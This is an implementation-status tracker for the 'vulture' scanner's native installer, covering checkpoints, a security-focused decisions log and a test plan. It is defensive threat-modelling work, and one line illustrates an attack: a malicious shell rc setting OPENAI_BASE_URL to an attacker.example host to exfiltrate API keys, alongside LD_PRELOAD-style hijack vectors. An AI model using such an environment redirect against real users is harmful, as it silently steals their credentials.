# 0044 — Native Installer · Implementation Status

**Status**: PARTIAL — scripts implemented; agent-runtime bundle deferred (see 0055)
**Last updated**: 2026-06-05

## Summary

The installer *scripts* are implemented and shipped (`install.sh`,
`scripts/build-release.sh`, `.github/workflows/release.yml`,
`scripts/smoke-install.sh`): the `vulture` CLI + embedded UI install
natively and are hardened in feature 0055 (Tier A + hardening pass).

The agent-runtime bundle (python-build-standalone + a hashed dependency
lockfile) is **deferred to the 0055 Tier-B follow-up**: agent-based
(multi-framework / LLM) scanning currently requires Docker (Mode A/B).

## Checkpoints

| # | Checkpoint | Owner | Status | Notes |
|---|---|---|---|---|
| 1 | Path-resolution refactor (Mode enum, `ResolveHome`, `RuntimeRoot`, install-mode-aware path helpers in `backend/internal/localdev/`) | — | not started | Gates everything else. Unit tests only — no behavior change in dev mode. |
| 2 | Static frontend handler (`backend/internal/handler/static.go`, wired into `server.go`, dev-mode bypassed) | — | not started | Verify Playwright suite still passes |
| 3 | New `vulture` subcommands: `start`, `stop`, `status`, `logs`, `doctor`, `uninstall` (each ≤ 80 LOC, cyclomatic ≤ 10) | — | not started | Reuses `internal/localdev/launcher.go`; adds `LaunchEphemeral` |
| 4 | `vulture scan` ephemeral mode (`--standalone` default true, `--keep-alive`, `--format`, `--output`) | — | not started | Today's `scan` requires a running server |
| 5 | `scripts/build-release.sh` (reproducible per-platform tarball) | — | not started | Pinned python-build-standalone tag + SHA |
| 6 | `install.sh` (POSIX sh, ~150 lines) | — | not started | Stages: detect → resolve → download → verify → extract → pip install → symlink → quarantine strip |
| 7 | GH Actions `release.yml` (4-platform matrix + smoke-install job) | — | not started | macOS-arm64 wheel availability is the highest-risk part |
| 8 | `scripts/smoke-install.sh` (used by CI and locally) | — | not started | Installs into tmp `VULTURE_HOME`, runs scan, uninstalls |
| 9 | Docs (`docs/guides/native_installation.md`, README updates, CLAUDE.md "Mode E" row) | — | not started | |
| 10 | E2E test: fresh install → scan → uninstall in tmp `VULTURE_HOME` | — | not started | Per-platform via CI matrix |
| 11 | Make targets (`release-local`, `freeze-deps`, `install-local`) | — | not started | |
| 12 | Security invariants S1–S17 (specs frozen in plan §"Security invariants") | — | not started | Each invariant maps to a CI gate, a unit test, or both |
| 13 | Supply-chain pipeline: cosign keyless signing + SBOM (Syft) + Trivy/pip-audit CVE gate + `vendor-pbs.yml` | — | not started | Release fails if any HIGH/CRITICAL CVE in bundled deps |
| 14 | Subprocess env scrubber (`backend/internal/localdev/env.go`) + golangci-lint rule banning direct `os.Environ()` in launcher | — | not started | Unit-tested against polluted parent env |
| 15 | Security-headers middleware + CORS lockdown + SPA fallback exclusion (`backend/internal/handler/static.go`) | — | not started | CSP, X-Content-Type-Options, Referrer-Policy, Permissions-Policy; CORS allow-list = `http://127.0.0.1:<port>` only |
| 16 | JWT-secret CSPRNG generation in `install.sh` + refuse-on-weak-secret validator in backend | — | not started | File mode 0600; `change-me-in-production` blocks daemon start |
| 17 | Logger redactor for API-key / JWT patterns + CI `verify-no-secrets-in-logs.sh` | — | not started | Mask first-4/last-4; lint-blocks release if any leak in smoke-test logs |
| 18 | `vulture stop` cmdline verification before SIGTERM + process-group setpgid | — | not started | PID-reuse mitigation |
| 19 | `vulture doctor` opt-in update check (persisted in `config/.env`) | — | not started | No outbound traffic by default |
| 20 | Frontend + catalogs embedded via `//go:embed` (install mode); dev mode unchanged | — | not started | Removes static-file symlink-follow risk class |
| 21 | Cosign bootstrap in install.sh (S8) — vendored static cosign binary + `vendor-cosign.yml` workflow | — | not started | Signature verification is default-on, not opt-in |
| 22 | TOCTOU re-validation at stage 7 (C4) — ownership + realpath checks immediately before extraction | — | not started | Closes the window across the network round-trips |
| 23 | `--rekor-url` inclusion-proof verification in install.sh (S8) | — | not started | Rejects signatures not logged to the transparency log |
| 24 | Fallback-tag refresh policy + `scripts/check-fallback-tag.sh` lint (H2) | — | not started | Ensures install.sh fallback ≥ `latest - 1` |
| 25 | `.trivyignore` + `.pip-audit-ignore` with 90-day expiry + SECURITY codeowner (H3) | — | not started | Avoids release-blocking on unfixed-upstream CVEs without losing audit trail |
| 26 | `vendor-pbs.yml` + `vendor-cosign.yml` dual-control (H4) — main-only + GH Environment approval | — | not started | Second-human approval required before vendor-asset upload |
| 27 | Logger redactor rewrite (S16) — field-name allow-list, no value-pattern matching (H5) | — | not started | Avoids over-redacting fingerprints / SHAs and under-redacting non-Bearer tokens |
| 28 | Append-only audit log (S18) `backend/internal/server/audit_log.go` | — | not started | Security events separated from runtime logs; mode 0600, rotated separately |
| 29 | `OPENAI_BASE_URL` / `OLLAMA_HOST` URL validation (S5) `backend/internal/llm/url_validator.go` | — | not started | Reject non-https + non-loopback unless `VULTURE_ALLOW_INSECURE_LLM=true` |
| 30 | `site-packages` integrity manifest (S19) generated at install time, checked by doctor | — | not started | Detect post-install user contamination |
| 31 | `scripts/smoke-negative.sh` (7 failure-path cases) (M7) | — | not started | CI matrix companion to smoke-install.sh |
| 32 | `vulture doctor` per-check remediation strings (M8) | — | not started | Each check returns OK/WARN/FAIL + remediation |
| 33 | Drop `/tmp` from `validate_home` blacklist; add `readlink -f` resolution (M1, M2) | — | not started | Smoke-install itself uses `/tmp` — current blacklist would block CI |
| 34 | Single-pass `tar -xzvf` for extraction + filelist capture (M3, replaces double-read) | — | not started | Eliminates the second-read race window |

## Decisions log

| Date | Decision | Rationale |
|---|---|---|
| 2026-05-11 | Repo URL: `github.com/bobinson/vulture` | Confirmed by owner |
| 2026-05-11 | Skip macOS notarization in v1 | `curl`-installed binaries are not quarantined by macOS; Gatekeeper does not interpose |
| 2026-05-11 | Bundle python-build-standalone (PBS) | Eliminates the system-Python-3.12 requirement; adds ~40 MB compressed per platform; one-command install on any Linux/macOS box |
| 2026-05-11 | Default `vulture scan` is ephemeral | Matches nuclei UX; `--keep-alive` and `--server <url>` opt-outs cover daemon-reuse and remote-server cases |
| 2026-05-11 | SQLite only in install mode | Postgres is for centralized / production deployments; install mode is single-user laptop scope |
| 2026-05-11 | JWT secret generated at install time via OS CSPRNG; never shipped (S1) | Default `change-me-in-production` is unsafe; same key across installs = trivial token forgery if exposed |
| 2026-05-11 | Daemon binds 127.0.0.1 only; `--unsafe-allow-network` opt-in (S2) | Combining LAN exposure with `VULTURE_LOCAL_MODE=true` (passwordless) is a footgun |
| 2026-05-11 | No sudo, ever — `install.sh` writes only to `$VULTURE_HOME` and `~/.local/bin` (S10) | Piped curl + sudo is a poor security norm and grants unneeded privilege |
| 2026-05-11 | Cosign keyless signing of tarball + `SHA256SUMS`; install.sh verifies if `cosign` is on PATH (S8) | Single-source-of-truth checksums are vulnerable to GitHub-account compromise |
| 2026-05-11 | python-build-standalone re-hosted as our own release asset (S9) | Eliminates the upstream third-party account from the install-time supply chain |
| 2026-05-11 | Frontend + catalogs embedded into Go binary via `//go:embed` (S13) | Removes the static-file symlink-follow attack surface entirely |
| 2026-05-11 | Subprocess env scrubbing for spawned agents (S5) | Polluted `PYTHONPATH` / `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` can otherwise hijack agent imports |
| 2026-05-11 | `vulture stop` verifies cmdline before SIGTERM (S4) | PID reuse can otherwise kill an unrelated user process |
| 2026-05-11 | `vulture doctor` update-check is opt-in, persisted in `config/.env` (S15) | No outbound traffic by default; explicit consent before any phone-home |
| 2026-05-11 | No self-update path in v1 (S17) | Removes a classic supply-chain vector; users invoke `install.sh` manually to upgrade |
| 2026-05-11 | Cosign verification is **default-on**, not opt-in (S8 revised) | The original "opt-in if cosign is installed" gave the default install no protection against GH-release rewrites |
| 2026-05-11 | install.sh re-validates `$VULTURE_HOME` at extraction stage (C4) | Two network round-trips sit between the original validate_home and extract_atomic — a local attacker could flip parent dir ownership in that window |
| 2026-05-11 | Rekor inclusion proof required (`--rekor-url`) | A stolen OIDC token without Rekor logging still produces "valid" cosign signatures locally; requiring inclusion-proof closes that gap |
| 2026-05-11 | `.trivyignore` + 90-day expiry + SECURITY codeowner (H3) | Without an allowlist, every release would block on unfixed-upstream CVEs; without expiry, the allowlist becomes a permanent vulnerability sink |
| 2026-05-11 | `vendor-pbs.yml` requires GH Environment approval (H4) | `workflow_dispatch` alone is single-person-publish; we need a second human on every vendored-asset upload |
| 2026-05-11 | Logger redactor uses field-name allow-list, not value patterns (S16 revised) | Value-pattern redaction (e.g. "any 64-hex string") over-redacts commit SHAs and fingerprints while under-redacting non-Bearer credentials |
| 2026-05-11 | Append-only audit log split from runtime logs (S18) | M6 from first audit; security events need an integrity-preserved channel separate from chatty runtime output |
| 2026-05-11 | `OPENAI_BASE_URL` URL validation at daemon startup (S5) | Otherwise a malicious shell rc with `OPENAI_BASE_URL=http://attacker.example/v1` exfiltrates API keys silently |
| 2026-05-11 | `site-packages` integrity manifest (S19) | Detects accidental `pip install` into the bundled python; informational WARN, not enforcement |
| 2026-05-11 | `/tmp` dropped from validate_home blacklist (M1) | Smoke-install itself uses `mktemp -d` paths under `/tmp`; blacklist was self-contradicting |
| 2026-05-11 | Single-pass `tar -xzvf` for extraction (M3) | Eliminates the second-read race window without losing filelist capture |
| 2026-05-11 | Phase 2 explicit follow-ups (L1, L2) | JWT-in-cookie migration + `--unsafe-allow-network` TLS/auth hardening deferred to a separate feature |

## Blocking issues

None yet.

## Test plan progress

| Suite | Status | Notes |
|---|---|---|
| Existing 486 CWE-agent unit tests | green (pre-feature baseline) | Must stay green |
| Go backend test suite | green | Must stay green |
| Playwright frontend E2E | green | Static-handler change must not break Vite-proxy dev path |
| New E2E install→scan→uninstall | not written | Phase 1 acceptance criterion |
| `scripts/smoke-install.sh` matrix | not written | 4 platforms in CI |
| `scripts/verify-no-secrets-in-logs.sh` (CI lint) | not written | Greps smoke-install logs for API-key / JWT patterns |
| `scripts/verify-release.sh` (reproducible-build verification) | not written | User-runnable: rebuild + sha-diff against published SHA256SUMS |
| Bind-address probe in smoke test (`ss -lntp` / `lsof`) | not written | Verifies daemon binds 127.0.0.1 only without `--unsafe-allow-network` |
| Env-scrubbing unit test (polluted parent env) | not written | Asserts agent subprocess env does NOT contain `PYTHONPATH` / `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` from parent |
| Static-handler test (SPA fallback exclusion + symlink refusal) | not written | Table-driven; covers `/api/*`, `/health`, `/metrics`, `/debug` |
| Logger redactor test | not written | Asserts API-key / JWT patterns are masked first-4/last-4 |
| JWT-secret refuse-on-weak validator test | not written | Daemon refuses to start with `change-me-in-production` / empty / short secrets |
| Trivy + pip-audit CVE gate (release pipeline) | not written | HIGH/CRITICAL CVE in bundled deps blocks release |

## Notes for the next session

- Start with checkpoint 1 (path resolution); everything else compiles
  cleanly only after `Mode` + `ResolveHome` land.
- Watch cyclomatic-complexity gate on `launcher.go`; pre-feature it's
  already close to the limit. Plan extracts `Daemonize` and
  `LaunchEphemeral` into sibling files before adding new logic.
- Pin python-build-standalone tag explicitly in
  `scripts/build-release.sh`; do not chase `latest`. Vendor the SHA so
  reproducible-build verification is mechanical.
